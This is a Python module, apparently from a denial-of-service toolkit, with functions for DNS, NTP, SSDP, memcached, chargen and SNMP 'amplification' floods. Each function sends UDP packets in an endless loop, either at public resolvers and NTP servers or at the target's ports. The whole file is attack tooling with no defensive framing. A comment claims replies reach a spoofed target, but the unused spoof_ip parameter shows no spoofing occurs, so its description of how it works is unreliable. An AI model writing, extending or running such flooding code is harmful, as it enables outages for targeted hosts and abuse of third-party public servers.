import socket
import struct
import random
from utils.payloads import get_dns_query, get_ntp_request

def dns_amp(target, port, stop_event, spoof_ip=None):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    query = get_dns_query()
    servers = ["8.8.8.8", "1.1.1.1", "9.9.9.9"]  # example
    while not stop_event.is_set():
        for srv in servers:
            sock.sendto(query, (srv, 53))
        # Response will go to spoofed IP (target)

def ntp_amp(target, port, stop_event, spoof_ip=None):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    req = get_ntp_request()
    servers = ["pool.ntp.org", "time.google.com"]
    while not stop_event.is_set():
        for srv in servers:
            try:
                sock.sendto(req, (socket.gethostbyname(srv), 123))
            except:
                pass

def ssdp_amp(target, port, stop_event, spoof_ip=None):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ssdp_msearch = b"M-SEARCH * HTTP/1.1\r\nHost:239.255.255.250:1900\r\nST:ssdp:all\r\nMan:\"ssdp:discover\"\r\nMX:2\r\n\r\n"
    while not stop_event.is_set():
        sock.sendto(ssdp_msearch, ("239.255.255.250", 1900))

def memcached_amp(target, port, stop_event, spoof_ip=None):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # stats command amplification
    payload = b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
    while not stop_event.is_set():
        try:
            sock.sendto(payload, (target, 11211))
        except:
            pass

def chargen_amp(target, port, stop_event, spoof_ip=None):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_event.is_set():
        sock.sendto(b"", (target, 19))

def snmp_amp(target, port, stop_event, spoof_ip=None):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # ASN.1 basic get request
    while not stop_event.is_set():
        sock.sendto(b"\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa0\x19\x02\x01\x01\x02\x01\x00\x02\x01\x00\x30\x0e\x30\x0c\x06\x08\x2b\x06\x01\x02\x01\x01\x01\x00\x05\x00", (target, 161))